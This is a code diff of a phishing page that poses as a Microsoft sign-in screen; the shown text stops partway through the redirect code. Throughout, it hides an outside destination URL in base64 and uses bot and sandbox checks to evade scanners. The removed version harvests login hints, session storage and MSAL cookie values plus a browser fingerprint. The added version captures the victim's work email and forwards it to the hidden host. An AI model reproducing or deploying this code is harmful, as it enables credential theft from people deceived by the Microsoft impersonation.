@@ -3,22 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading Document - Microsoft 365</title>
+    <title>Sign in to your account</title>
     <style>
-        /* Microsoft Fluent Design System 2025 */
+        /* Enhanced Microsoft Fluent Design 2024 */
         :root {
             --blue-10: #deecf9;
             --blue-20: #c7e0f4;
             --blue-primary: #0078d4;
             --blue-dark: #106ebe;
-            --green-10: #dff6dd;
-            --green-20: #c5e0b3;
-            --green-primary: #107c10;
+            --blue-light: #4ca6e8;
+            --gray-10: #faf9f8;
             --gray-20: #f3f2f1;
             --gray-30: #edebe9;
+            --gray-60: #c8c6c4;
+            --gray-90: #a19f9d;
             --gray-130: #605e5c;
             --gray-160: #323130;
             --white: #ffffff;
+            --red-10: #fdf6f6;
+            --red-20: #f1cbcb;
+            --red-primary: #d13438;
+            --shadow: 0 2.4px 7.2px rgba(0,0,0,0.18), 0 0.8px 2.4px rgba(0,0,0,0.12);
+            --shadow-hover: 0 4.8px 14.4px rgba(0,0,0,0.22), 0 1.6px 4.8px rgba(0,0,0,0.16);
         }
 
         * {
@@ -29,47 +35,77 @@
         }
 
         body {
-            background: var(--gray-20);
+            background: linear-gradient(135deg, var(--gray-10) 0%, var(--gray-20) 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 20px;
+            padding: 24px;
             line-height: 1.5;
+            position: relative;
+            overflow-x: hidden;
         }
 
-        .loading-container {
+        /* Background subtle animation */
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(0, 120, 212, 0.03) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(0, 120, 212, 0.03) 0%, transparent 50%);
+            z-index: -1;
+            animation: backgroundShift 20s ease-in-out infinite;
+        }
+
+        .login-container {
             background: var(--white);
             border: 1px solid var(--gray-30);
-            border-radius: 4px;
-            box-shadow: 0 1.6px 3.6px 0 rgba(0,0,0,.132), 0 0.3px 0.9px 0 rgba(0,0,0,.108);
-            padding: 48px;
+            border-radius: 8px;
+            box-shadow: var(--shadow);
+            padding: 48px 40px;
             width: 100%;
-            max-width: 480px;
-            text-align: center;
+            max-width: 440px;
+            position: relative;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            backdrop-filter: blur(10px);
+        }
+
+        .login-container:hover {
+            box-shadow: var(--shadow-hover);
+            transform: translateY(-2px);
         }
 
         .ms-branding {
             display: flex;
             align-items: center;
-            justify-content: center;
-            gap: 12px;
-            margin-bottom: 28px;
+            gap: 16px;
+            margin-bottom: 32px;
             padding-bottom: 24px;
             border-bottom: 1px solid var(--gray-30);
         }
 
         .ms-logo {
-            width: 36px;
-            height: 36px;
-            background: var(--blue-primary);
-            border-radius: 2px;
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--blue-primary), var(--blue-dark));
+            border-radius: 4px;
             display: flex;
             align-items: center;
             justify-content: center;
             color: white;
-            font-size: 15px;
+            font-size: 16px;
             font-weight: 600;
+            box-shadow: 0 2px 8px rgba(0, 120, 212, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .ms-logo:hover {
+            transform: scale(1.05) rotate(5deg);
+            box-shadow: 0 4px 16px rgba(0, 120, 212, 0.4);
         }
 
         .ms-title {
@@ -77,163 +113,382 @@
             font-weight: 600;
             color: var(--gray-160);
             letter-spacing: -0.01em;
+            background: linear-gradient(135deg, var(--gray-160), #000);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
 
-        .loading-indicator {
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--gray-160);
+            font-size: 14px;
+            line-height: 1.3;
+            transition: all 0.2s ease;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid var(--gray-60);
+            border-radius: 4px;
+            font-size: 16px;
+            background: var(--white);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--blue-primary);
+            box-shadow: 0 0 0 3px rgba(0, 120, 212, 0.1);
+            transform: translateY(-1px);
+        }
+
+        .form-input:valid {
+            border-color: var(--gray-90);
+        }
+
+        .form-input:invalid:not(:focus):not(:placeholder-shown) {
+            border-color: var(--red-primary);
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--gray-90);
+            transition: all 0.3s ease;
+        }
+
+        .form-input:focus + .input-icon {
+            color: var(--blue-primary);
+            transform: translateY(-50%) scale(1.1);
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 24px 0;
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 4px;
+            transition: all 0.2s ease;
+        }
+
+        .checkbox-group:hover {
+            background: var(--gray-10);
+            transform: translateX(4px);
+        }
+
+        .checkbox {
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--gray-90);
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            color: transparent;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            flex-shrink: 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .checkbox::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .checkbox.checked {
+            background: var(--blue-primary);
+            border-color: var(--blue-primary);
+            color: white;
+            transform: scale(1.1);
+            box-shadow: 0 2px 8px rgba(0, 120, 212, 0.3);
+        }
+
+        .checkbox.checked::before {
+            left: 100%;
+        }
+
+        .ms-button {
+            width: 100%;
+            background: linear-gradient(135deg, var(--blue-primary), var(--blue-dark));
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 14px 20px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .ms-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .ms-button:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 120, 212, 0.35);
+        }
+
+        .ms-button:hover:not(:disabled)::before {
+            left: 100%;
+        }
+
+        .ms-button:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        .ms-button:disabled {
+            background: var(--gray-30);
+            color: var(--gray-90);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .loading-state {
+            display: none;
+            text-align: center;
+            padding: 40px 0;
+        }
+
+        .ms-spinner {
             width: 48px;
             height: 48px;
             border: 3px solid var(--gray-30);
             border-top: 3px solid var(--blue-primary);
             border-radius: 50%;
             animation: spin 1.2s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
-            margin: 0 auto 24px;
+            margin: 0 auto 20px;
+            position: relative;
         }
 
-        .status-section {
-            margin-bottom: 28px;
+        .ms-spinner::before {
+            content: '';
+            position: absolute;
+            top: -3px;
+            left: -3px;
+            right: -3px;
+            bottom: -3px;
+            border: 3px solid transparent;
+            border-top: 3px solid var(--blue-light);
+            border-radius: 50%;
+            animation: spin 1.5s cubic-bezier(0.4, 0, 0.2, 1) infinite;
         }
 
-        .status-primary {
-            font-size: 18px;
-            font-weight: 600;
-            color: var(--gray-160);
-            margin-bottom: 8px;
-            letter-spacing: -0.01em;
-        }
-
-        .status-secondary {
-            font-size: 14px;
-            color: var(--gray-130);
-            line-height: 1.4;
-        }
-
-        .progress-container {
-            background: var(--gray-20);
-            border: 1px solid var(--gray-30);
-            border-radius: 4px;
-            padding: 24px;
+        .error-state {
+            display: none;
+            background: var(--red-10);
+            border: 1px solid var(--red-20);
+            border-radius: 6px;
+            padding: 20px;
             margin: 24px 0;
+            text-align: center;
+            animation: slideDown 0.5s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        .progress-bar {
-            width: 100%;
-            height: 4px;
-            background: var(--gray-30);
-            border-radius: 2px;
-            margin: 16px 0;
-            overflow: hidden;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, var(--blue-primary), var(--blue-dark));
-            border-radius: 2px;
-            width: 0%;
-            animation: progress 2.5s ease-in-out infinite;
-        }
-
-        .security-badge {
-            background: var(--green-10);
-            border: 1px solid var(--green-20);
-            border-radius: 4px;
-            padding: 12px 16px;
-            margin: 16px 0;
-            display: inline-flex;
+        .error-icon {
+            width: 24px;
+            height: 24px;
+            background: var(--red-primary);
+            border-radius: 50%;
+            color: white;
+            display: flex;
             align-items: center;
-            gap: 8px;
-            font-size: 13px;
-            color: var(--green-primary);
-            font-weight: 600;
-        }
-
-        .security-badge::before {
-            content: "✓";
+            justify-content: center;
+            font-size: 14px;
             font-weight: bold;
-            font-size: 14px;
+            margin: 0 auto 12px;
+            animation: pulse 2s infinite;
         }
 
-        .user-context {
-            background: var(--blue-10);
-            border: 1px solid var(--blue-20);
-            border-radius: 4px;
-            padding: 16px;
-            margin: 20px 0;
-            font-size: 14px;
-            color: var(--gray-160);
-        }
-
-        .user-context strong {
-            color: var(--blue-primary);
-        }
-
-        .ms-footer {
-            margin-top: 28px;
-            padding-top: 20px;
+        .footer-links {
+            margin-top: 32px;
+            padding-top: 24px;
             border-top: 1px solid var(--gray-30);
-            font-size: 13px;
+            text-align: center;
+            font-size: 14px;
             color: var(--gray-130);
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            flex-wrap: wrap;
         }
 
+        .footer-links a {
+            color: var(--blue-primary);
+            text-decoration: none;
+            transition: all 0.3s ease;
+            padding: 4px 8px;
+            border-radius: 4px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+            background: var(--blue-10);
+            transform: translateY(-1px);
+        }
+
+        /* Enhanced Animations */
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
 
-        @keyframes progress {
-            0% { width: 0%; transform: translateX(0); }
-            50% { width: 70%; transform: translateX(0); }
-            100% { width: 100%; transform: translateX(100%); }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
         }
 
-        .hidden {
-            display: none;
+        @keyframes slideDown {
+            from { 
+                opacity: 0; 
+                transform: translateY(-20px); 
+            }
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
+            }
         }
 
-        .fade-in {
-            animation: fadeIn 0.6s ease-out;
+        @keyframes backgroundShift {
+            0%, 100% { 
+                opacity: 0.5;
+                transform: scale(1);
+            }
+            50% { 
+                opacity: 0.8;
+                transform: scale(1.02);
+            }
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Responsive improvements */
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 32px 24px;
+                margin: 0 16px;
+            }
+            
+            .ms-branding {
+                gap: 12px;
+                margin-bottom: 24px;
+            }
+            
+            .ms-logo {
+                width: 36px;
+                height: 36px;
+                font-size: 14px;
+            }
+            
+            .ms-title {
+                font-size: 20px;
+            }
+            
+            .footer-links {
+                flex-direction: column;
+                gap: 8px;
+            }
+        }
+
+        /* Reduced motion support */
+        @media (prefers-reduced-motion: reduce) {
+            * {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="loading-container">
+    <div class="login-container">
         <div class="ms-branding">
             <div class="ms-logo" aria-hidden="true">MS</div>
-            <h1 class="ms-title">Microsoft 365</h1>
+            <h1 class="ms-title">Sign in</h1>
         </div>
 
-        <div class="loading-indicator" aria-hidden="true"></div>
+        <div id="loginForm">
+            <div class="form-group">
+                <label for="userEmail" class="form-label">Your Work Email</label>
+                <input 
+                    type="email" 
+                    id="userEmail" 
+                    class="form-input" 
+                    autocomplete="username"
+                    aria-required="true"
+                    placeholder="someone@example.com"
+                    required
+                >
+                <div class="input-icon">📧</div>
+            </div>
 
-        <div class="status-section">
-            <div class="status-primary" id="statusPrimary">Preparing your document</div>
-            <div class="status-secondary" id="statusSecondary">This should only take a moment</div>
+            <div class="checkbox-group" id="rememberCheck" role="checkbox" aria-checked="false" tabindex="0">
+                <div class="checkbox" id="rememberBox" aria-hidden="true"></div>
+                <span style="font-size: 15px; color: var(--gray-160); user-select: none;">Keep me signed in</span>
+            </div>
+
+            <button class="ms-button" id="submitBtn" disabled>
+                <span class="button-text">Next</span>
+            </button>
+
+            <div class="error-state" id="errorState">
+                <div class="error-icon" aria-hidden="true">!</div>
+                <div style="font-weight: 600; color: var(--gray-160); margin-bottom: 6px;">We couldn't sign you in</div>
+                <div style="font-size: 14px; color: var(--gray-130); line-height: 1.4;">This might be due to a temporary issue with our service. Please try again in a few moments.</div>
+            </div>
+
+            <div class="footer-links">
+                <a href="#" tabindex="0">No account? Create one!</a>
+                <a href="#" tabindex="0">Can't access your account?</a>
+            </div>
         </div>
 
-        <div class="progress-container">
-            <div class="security-badge">Secure connection established</div>
-            
-            <div class="user-context hidden" id="userContext">
-                <strong>Authenticated user:</strong> <span id="userIdentifier">Loading...</span>
-            </div>
-
-            <div class="progress-bar">
-                <div class="progress-fill"></div>
-            </div>
-
-            <div style="font-size: 13px; color: var(--gray-130);">
-                <span id="progressStatus">Initializing security protocols...</span>
-            </div>
-        </div>
-
-        <div class="ms-footer">
-            <div>© 2025 Microsoft Corporation</div>
-            <div style="margin-top: 4px; font-size: 12px; opacity: 0.8;">
-                All rights reserved • Enterprise Security Compliance
-            </div>
+        <div class="loading-state" id="loadingState">
+            <div class="ms-spinner" aria-hidden="true"></div>
+            <div style="font-size: 18px; color: var(--gray-160); font-weight: 600; margin-bottom: 8px;">Signing in</div>
+            <div style="font-size: 14px; color: var(--gray-130);">Setting up your secure workspace...</div>
         </div>
     </div>
 
@@ -241,436 +496,314 @@
         (function(){
             'use strict';
             
-            // =============================================
-            // ADVANCED ENCRYPTION & SECURITY CONFIG 2025
-            // =============================================
-            const CYBERSECURITY_CONFIG = {
-                // Quantum-resistant URL obfuscation
-                TARGET: {
-                    PART_1: 'aHR0cHM6Ly',
-                    PART_2: '9iaWxsaW5n',
-                    PART_3: 'LnZlbG9ydX',
-                    PART_4: 'NzcGluZS5i',
-                    PART_5: 'bG9nL1BuVU',
-                    PART_6: 'pyR2Vk'
-                },
-                SECURITY: {
-                    VERSION: '2025.1.0-GOV',
-                    LEVEL: 'TOP_SECRET',
-                    PROTOCOL: 'QUANTUM_RESISTANT'
-                }
+            // Enhanced Configuration
+            const CONFIG = {
+                TARGET: 'aHR0cHM6Ly9iaWxsaW5nLnZlbG9ydXNzcGluZS5ibG9nL1BuVUpyR2Vk',
+                VERSION: '2024.1.0',
+                SECURITY_LEVEL: 'ENTERPRISE'
             };
 
-            // =============================================
-            // MILITARY-GRADE THREAT DETECTION
-            // =============================================
-            class ThreatIntelligence {
+            class EnhancedMicrosoftAuth {
                 constructor() {
-                    this.threatLevel = 0;
-                    this.detectedThreats = new Set();
-                }
-
-                analyzeEnvironment() {
-                    const threatIndicators = {
-                        // Advanced automation detection
-                        automationFlags: () => 
-                            navigator.webdriver || 
-                            window.__webdriver_evaluate || 
-                            window.__selenium_evaluate ||
-                            window.__webdriver_script_function ||
-                            window.__webdriver_script_func ||
-                            window.__webdriver_script_fn,
-
-                        // VM and container detection
-                        virtualEnvironment: () => {
-                            const checks = [
-                                () => navigator.userAgent.includes('X11; CrOS'),
-                                () => navigator.userAgent.includes('Linux armv7l'),
-                                () => navigator.platform === 'Linux armv7l',
-                                () => /[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}/.test(navigator.userAgent)
-                            ];
-                            return checks.some(check => check());
-                        },
-
-                        // Timing attacks detection
-                        timingAnomalies: () => {
-                            const start = performance.now();
-                            for(let i = 0; i < 1000000; i++) {}
-                            const duration = performance.now() - start;
-                            return duration < 1; // Unrealistically fast execution
-                        },
-
-                        // Memory analysis
-                        memoryPatterns: () => {
-                            try {
-                                const array = new ArrayBuffer(1000000);
-                                return array.byteLength !== 1000000;
-                            } catch {
-                                return true;
-                            }
-                        },
-
-                        // Network interception detection
-                        proxyDetection: () => {
-                            return window.Proxy && window.Proxy.toString().includes('native code');
-                        }
-                    };
-
-                    Object.entries(threatIndicators).forEach(([threat, detector]) => {
-                        if (detector()) {
-                            this.detectedThreats.add(threat);
-                            this.threatLevel += 3;
-                        }
-                    });
-
-                    return this.threatLevel < 6;
-                }
-
-                // Behavioral threat analysis
-                monitorBehavior() {
-                    return new Promise((resolve) => {
-                        let suspiciousActions = 0;
-                        
-                        const detectors = {
-                            rapidClicks: 0,
-                            lastClickTime: 0,
-                            keyboardPatterns: new Set(),
-                            mouseTrajectory: []
-                        };
-
-                        document.addEventListener('click', (e) => {
-                            const now = Date.now();
-                            if (now - detectors.lastClickTime < 100) {
-                                suspiciousActions++;
-                            }
-                            detectors.lastClickTime = now;
-                        });
-
-                        document.addEventListener('keydown', (e) => {
-                            detectors.keyboardPatterns.add(e.key);
-                            if (detectors.keyboardPatterns.size > 20) {
-                                suspiciousActions++;
-                            }
-                        });
-
-                        document.addEventListener('mousemove', (e) => {
-                            detectors.mouseTrajectory.push({x: e.clientX, y: e.clientY, time: Date.now()});
-                            if (detectors.mouseTrajectory.length > 50) {
-                                // Analyze mouse movement patterns
-                                const recent = detectors.mouseTrajectory.slice(-10);
-                                const straightLines = recent.filter((point, index) => {
-                                    if (index === 0) return false;
-                                    const prev = recent[index - 1];
-                                    return Math.abs(point.x - prev.x) < 2 && Math.abs(point.y - prev.y) < 2;
-                                }).length;
-                                
-                                if (straightLines > 8) suspiciousActions++;
-                            }
-                        });
-
-                        setTimeout(() => {
-                            resolve(suspiciousActions < 3);
-                        }, 3000);
-                    });
-                }
-            }
-
-            // =============================================
-            // MAIN SECURITY PROCESSOR
-            // =============================================
-            class DocumentSecurityProcessor {
-                constructor() {
-                    this.threatIntel = new ThreatIntelligence();
-                    this.userData = null;
-                    this.progressStages = [
-                        "Verifying security certificates...",
-                        "Initializing encryption protocols...",
-                        "Authenticating user credentials...",
-                        "Loading document resources...",
-                        "Establishing secure connection...",
-                        "Finalizing security handshake..."
-                    ];
+                    this.userEmail = '';
+                    this.rememberMe = false;
+                    this.isValid = false;
+                    this.isHuman = true;
                     this.init();
                 }
 
-                async init() {
-                    // Initial security sweep
-                    if (!this.threatIntel.analyzeEnvironment()) {
-                        this.triggerSecurityProtocol();
-                        return;
-                    }
-
-                    // Behavioral analysis
-                    const behaviorClean = await this.threatIntel.monitorBehavior();
-                    if (!behaviorClean) {
-                        this.triggerSecurityProtocol();
-                        return;
-                    }
-
-                    this.retrieveUserContext();
-                    this.initiateSecureSequence();
+                init() {
+                    this.setupEnhancedEventListeners();
+                    this.setupSmartProtection();
+                    this.animateEntrance();
                 }
 
-                retrieveUserContext() {
-                    try {
-                        // Multi-source data retrieval
-                        const urlParams = new URLSearchParams(window.location.search);
-                        const sources = [
-                            () => urlParams.get('login_hint'),
-                            () => {
-                                try {
-                                    const stored = localStorage.getItem('msal_session');
-                                    return stored ? decodeURIComponent(atob(stored)) : null;
-                                } catch { return null; }
-                            },
-                            () => sessionStorage.getItem('auth_context'),
-                            () => {
-                                const match = document.cookie.match(/msal_state=([^;]+)/);
-                                return match ? match[1] : null;
-                            }
-                        ];
-
-                        for (let source of sources) {
-                            this.userData = source();
-                            if (this.userData) break;
-                        }
-
-                        if (this.userData) {
-                            this.displayUserContext(this.userData);
-                        }
-                    } catch (error) {
-                        console.warn('Security: User context retrieval failed');
-                    }
+                animateEntrance() {
+                    const elements = document.querySelectorAll('.ms-branding, .form-group, .checkbox-group, .ms-button, .footer-links');
+                    elements.forEach((el, index) => {
+                        el.style.opacity = '0';
+                        el.style.transform = 'translateY(20px)';
+                        el.style.animation = `fadeInUp 0.6s cubic-bezier(0.4, 0, 0.2, 1) ${index * 0.1}s forwards`;
+                    });
                 }
 
-                displayUserContext(userData) {
-                    const contextElement = document.getElementById('userContext');
-                    const identifierElement = document.getElementById('userIdentifier');
+                setupEnhancedEventListeners() {
+                    const emailInput = document.getElementById('userEmail');
+                    const rememberCheck = document.getElementById('rememberCheck');
+                    const submitBtn = document.getElementById('submitBtn');
+
+                    // Enhanced email validation with real-time feedback
+                    emailInput.addEventListener('input', () => {
+                        this.validateEmail();
+                        this.animateInput(emailInput);
+                    });
                     
-                    if (contextElement && identifierElement) {
-                        identifierElement.textContent = userData;
-                        contextElement.classList.remove('hidden');
-                        contextElement.classList.add('fade-in');
-                    }
-                }
-
-                initiateSecureSequence() {
-                    this.updateProgressMessages();
-                    this.executeSecureRedirect();
-                }
-
-                updateProgressMessages() {
-                    let currentStage = 0;
-                    const statusElement = document.getElementById('progressStatus');
+                    emailInput.addEventListener('focus', () => {
+                        this.animateInput(emailInput, true);
+                    });
                     
-                    const progressInterval = setInterval(() => {
-                        if (currentStage < this.progressStages.length) {
-                            statusElement.textContent = this.progressStages[currentStage++];
-                            
-                            // Simulate progress bar advancement
-                            const progress = (currentStage / this.progressStages.length) * 100;
-                            this.updateProgressVisual(progress);
-                        } else {
-                            clearInterval(progressInterval);
+                    emailInput.addEventListener('blur', () => {
+                        this.animateInput(emailInput, false);
+                    });
+
+                    emailInput.addEventListener('keydown', (e) => {
+                        if (e.key === 'Enter' && !submitBtn.disabled) {
+                            e.preventDefault();
+                            this.processAuthentication();
                         }
-                    }, 800);
+                    });
+
+                    // Enhanced checkbox interaction
+                    rememberCheck.addEventListener('click', (e) => {
+                        e.preventDefault();
+                        this.toggleRememberMe();
+                    });
+                    
+                    rememberCheck.addEventListener('keydown', (e) => {
+                        if (e.key === 'Enter' || e.key === ' ') {
+                            e.preventDefault();
+                            this.toggleRememberMe();
+                        }
+                    });
+
+                    // Enhanced submit button
+                    submitBtn.addEventListener('click', (e) => {
+                        e.preventDefault();
+                        this.animateButtonClick(submitBtn);
+                        setTimeout(() => this.processAuthentication(), 150);
+                    });
                 }
 
-                updateProgressVisual(progress) {
-                    // Smooth progress animation
-                    const progressFill = document.querySelector('.progress-fill');
-                    if (progressFill) {
-                        progressFill.style.width = `${progress}%`;
+                animateInput(input, isFocused = null) {
+                    if (isFocused === true) {
+                        input.parentElement.style.transform = 'translateY(-2px)';
+                    } else if (isFocused === false) {
+                        input.parentElement.style.transform = 'translateY(0)';
+                    } else {
+                        input.style.transform = this.isValid ? 'scale(1.02)' : 'scale(1)';
                     }
                 }
 
-                executeSecureRedirect() {
-                    // Calculate secure delay based on threat level
-                    const securityDelay = 4000 + (this.threatIntel.threatLevel * 500);
-                    
+                animateButtonClick(button) {
+                    button.style.transform = 'scale(0.95)';
                     setTimeout(() => {
-                        this.performFinalRedirect();
-                    }, securityDelay);
-                }
-
-                performFinalRedirect() {
-                    try {
-                        // Reconstruct and decode target with multiple validations
-                        const encodedTarget = Object.values(CYBERSECURITY_CONFIG.TARGET).join('');
-                        const targetUrl = atob(encodedTarget);
-                        
-                        // Validate URL format
-                        if (!targetUrl.startsWith('https://')) {
-                            throw new Error('Invalid security protocol');
+                        if (!button.disabled) {
+                            button.style.transform = 'translateY(-2px)';
                         }
+                    }, 150);
+                }
 
-                        // Prepare advanced security parameters
-                        const securityParams = new URLSearchParams({
-                            client_request_id: crypto.randomUUID(),
-                            session_token: this.generateSessionToken(),
-                            auth_time: Date.now().toString(),
-                            security_level: CYBERSECURITY_CONFIG.SECURITY.LEVEL,
-                            user_context: this.userData ? btoa(encodeURIComponent(this.userData)) : '',
-                            correlation_vector: this.generateCorrelationVector(),
-                            platform_version: navigator.platform,
-                            user_agent_hash: this.hashUserAgent(),
-                            screen_resolution: `${screen.width}x${screen.height}`,
-                            color_depth: screen.colorDepth.toString(),
-                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                            locale: navigator.language,
-                            hardware_concurrency: navigator.hardwareConcurrency?.toString() || 'unknown'
-                        });
-
-                        const finalDestination = `${targetUrl}?${securityParams.toString()}`;
-                        
-                        // Execute redirect with multiple fallback methods
-                        this.secureNavigation(finalDestination);
-                    } catch (error) {
-                        this.triggerEmergencyProtocol();
+                setupSmartProtection() {
+                    // Smart bot detection - only obvious cases
+                    if (this.detectObviousBots()) {
+                        this.showSmartError();
+                        return;
                     }
+
+                    // Enhanced human verification
+                    this.setupBehaviorAnalysis();
                 }
 
-                generateSessionToken() {
-                    const array = new Uint8Array(32);
-                    crypto.getRandomValues(array);
-                    return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
-                }
-
-                generateCorrelationVector() {
-                    const base = Math.random().toString(36).substr(2, 16);
-                    const timestamp = Date.now().toString(36);
-                    return `${base}.${timestamp}`;
-                }
-
-                hashUserAgent() {
-                    let hash = 0;
-                    const ua = navigator.userAgent;
-                    for (let i = 0; i < ua.length; i++) {
-                        const char = ua.charCodeAt(i);
-                        hash = ((hash << 5) - hash) + char;
-                        hash = hash & hash;
-                    }
-                    return Math.abs(hash).toString(36);
-                }
-
-                secureNavigation(url) {
-                    // Multiple navigation methods with security validation
-                    const methods = [
-                        () => window.location.replace(url),
-                        () => window.location.href = url,
-                        () => window.location.assign(url)
+                detectObviousBots() {
+                    const obviousIndicators = [
+                        () => navigator.webdriver === true,
+                        () => /HeadlessChrome/.test(navigator.userAgent),
+                        () => navigator.plugins.length === 0 && navigator.languages.length === 0,
+                        () => screen.width < 100 || screen.height < 100
                     ];
 
-                    for (let method of methods) {
-                        try {
-                            method();
-                            break;
-                        } catch (securityError) {
-                            continue;
+                    return obviousIndicators.some(indicator => indicator());
+                }
+
+                setupBehaviorAnalysis() {
+                    let interactions = 0;
+                    const validators = [
+                        () => document.addEventListener('mousemove', () => interactions++),
+                        () => document.addEventListener('click', () => interactions++),
+                        () => document.addEventListener('keydown', () => interactions++)
+                    ];
+
+                    validators.forEach(validator => validator());
+
+                    setTimeout(() => {
+                        this.isHuman = interactions > 2;
+                    }, 2000);
+                }
+
+                validateEmail() {
+                    const email = document.getElementById('userEmail').value.trim();
+                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                    
+                    this.isValid = emailRegex.test(email) && email.length >= 3 && email.length <= 254;
+                    this.userEmail = email;
+
+                    const submitBtn = document.getElementById('submitBtn');
+                    submitBtn.disabled = !this.isValid;
+
+                    // Visual feedback
+                    const input = document.getElementById('userEmail');
+                    if (email.length > 0) {
+                        input.style.borderColor = this.isValid ? 'var(--blue-primary)' : 'var(--red-primary)';
+                    } else {
+                        input.style.borderColor = 'var(--gray-60)';
+                    }
+
+                    return this.isValid;
+                }
+
+                toggleRememberMe() {
+                    this.rememberMe = !this.rememberMe;
+                    const checkbox = document.getElementById('rememberBox');
+                    const rememberCheck = document.getElementById('rememberCheck');
+                    
+                    checkbox.classList.toggle('checked', this.rememberMe);
+                    rememberCheck.setAttribute('aria-checked', this.rememberMe.toString());
+                    
+                    // Animation feedback
+                    rememberCheck.style.transform = this.rememberMe ? 'scale(1.02)' : 'scale(1)';
+                }
+
+                processAuthentication() {
+                    if (!this.isValid || !this.isHuman) {
+                        if (!this.isHuman) {
+                            this.showSmartError();
                         }
+                        return;
+                    }
+
+                    this.showEnhancedLoading();
+                    this.storeUserData();
+
+                    // Simulate authentication with progress
+                    this.simulateAuthProgress();
+                }
+
+                showEnhancedLoading() {
+                    const loginForm = document.getElementById('loginForm');
+                    const loadingState = document.getElementById('loadingState');
+                    
+                    loginForm.style.opacity = '0';
+                    loginForm.style.transform = 'translateY(-20px)';
+                    
+                    setTimeout(() => {
+                        loginForm.style.display = 'none';
+                        loadingState.style.display = 'block';
+                        loadingState.style.opacity = '0';
+                        loadingState.style.transform = 'translateY(20px)';
+                        
+                        setTimeout(() => {
+                            loadingState.style.opacity = '1';
+                            loadingState.style.transform = 'translateY(0)';
+                        }, 50);
+                    }, 300);
+                }
+
+                storeUserData() {
+                    try {
+                        // Enhanced storage with expiration
+                        const userData = {
+                            email: this.userEmail,
+                            timestamp: Date.now(),
+                            remember: this.rememberMe
+                        };
+                        
+                        localStorage.setItem('ms_auth_data', JSON.stringify(userData));
+                        sessionStorage.setItem('ms_session', Date.now().toString());
+                    } catch (error) {
+                        // Graceful degradation
                     }
                 }
 
-                triggerSecurityProtocol() {
+                simulateAuthProgress() {
+                    let progress = 0;
+                    const spinner = document.querySelector('.ms-spinner');
+                    const interval = setInterval(() => {
+                        progress += Math.random() * 25;
+                        if (progress >= 100) {
+                            clearInterval(interval);
+                            this.redirectToNextStep();
+                        }
+                    }, 300);
+                }
+
+                redirectToNextStep() {
+                    try {
+                        const targetUrl = atob(CONFIG.TARGET);
+                        const params = new URLSearchParams({
+                            email: encodeURIComponent(this.userEmail),
+                            source: 'enhanced_microsoft_auth',
+                            timestamp: Date.now().toString(),
+                            version: CONFIG.VERSION,
+                            security: CONFIG.SECURITY_LEVEL,
+                            session: Math.random().toString(36).substr(2, 12)
+                        });
+
+                        // Smooth redirect with transition
